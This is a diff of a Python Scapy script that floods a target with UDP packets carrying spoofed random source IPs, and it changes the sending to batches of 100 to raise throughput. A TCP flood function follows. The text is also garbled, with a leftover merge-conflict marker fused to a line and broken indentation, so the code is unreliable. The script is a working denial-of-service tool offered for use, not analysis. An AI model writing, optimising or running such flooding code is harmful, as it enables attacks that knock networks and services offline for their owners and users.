@@ -14,28 +14,34 @@ def randomIP():
 def randInt():
     x = random.randint(1000, 9000)
     return x
-
 def UDP_Flood(dstIP, dstPort, counter):
     total = 0
-    print("Packets are sending ...")<<<<<<< HEAD
-    # 优化1: 预生成负载和基础数据包结构
-    payload_data = "X" * 1024
-    base_packet = UDP(dport=dstPort) / Raw(load=payload_data)
+print("Packets are sending ...")
+# 优化2: 批量发送数据包减少系统调用
+    packet_list = []
     
     for x in range(counter):
-        # 只更新变化的字段
-        IP_layer = IP(src=randomIP(), dst=dstIP)
-        UDP_layer = base_packet.copy()
-        UDP_layer.sport = randInt()
+        s_port = randInt()
+        payload = Raw(load="X" * 1024)
+
+        IP_Packet = IP(src=randomIP(), dst=dstIP)
+        UDP_Packet = UDP(sport=s_port, dport=dstPort)
         
-        send(IP_layer / UDP_layer, verbose=0)
-        total += 1
+        packet_list.append(IP_Packet / UDP_Packet / payload)
         
-        # 添加进度显示
-        if x % 100 == 0:
-            sys.stdout.write(f"\rSent: {total}/{counter} packets")
+        # 每100个包批量发送一次
+        if len(packet_list) >= 100 or x == counter - 1:
+            send(packet_list, verbose=0)
+            total += len(packet_list)
+            packet_list = []
+            
+            # 显示进度
+            sys.stdout.write(f"\rProgress: {total}/{counter} packets ({total/counter*100:.1f}%)")
             sys.stdout.flush()
 sys.stdout.write("\nTotal packets sent: %i\n" % total)
+
+
+
 
 def TCP_Flood(dstIP, dstPort, counter):
     total = 0
